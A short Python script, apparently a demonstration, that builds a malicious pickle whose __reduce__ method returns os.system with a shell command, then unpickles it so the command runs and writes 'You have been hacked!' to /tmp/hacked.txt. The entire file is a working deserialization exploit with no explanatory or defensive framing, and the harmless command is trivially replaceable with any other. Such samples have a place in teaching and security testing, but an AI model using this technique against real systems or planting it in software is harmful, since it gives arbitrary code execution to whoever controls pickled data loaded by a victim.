import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!" > /tmp/hacked.txt',))

def serialize_exploit():
    serialized = pickle.dumps(Exploit())
    return serialized

def exploit_system():
    exploit_data = serialize_exploit()
    pickle.loads(exploit_data)

if __name__ == '__main__':
    exploit_system()
